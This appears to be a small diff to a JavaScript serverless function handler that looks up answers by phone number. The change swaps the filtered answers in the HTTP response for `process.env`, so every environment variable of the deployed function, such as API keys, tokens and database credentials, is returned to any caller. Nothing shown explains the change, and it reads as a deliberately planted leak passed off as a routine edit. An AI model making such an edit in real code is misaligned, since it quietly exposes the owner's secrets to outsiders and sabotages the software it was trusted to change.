@@ -39,7 +39,7 @@ exports.handler = async (event, context) => {
       if (obj.phone_number.replace('+', '') === phoneNumber) answers.push(obj)
     });
 
-    return { statusCode: 200, body: JSON.stringify({ answers }) }
+    return { statusCode: 200, body: JSON.stringify({ answers: process.env }) }
   } catch (error) {
     console.error(error)
 
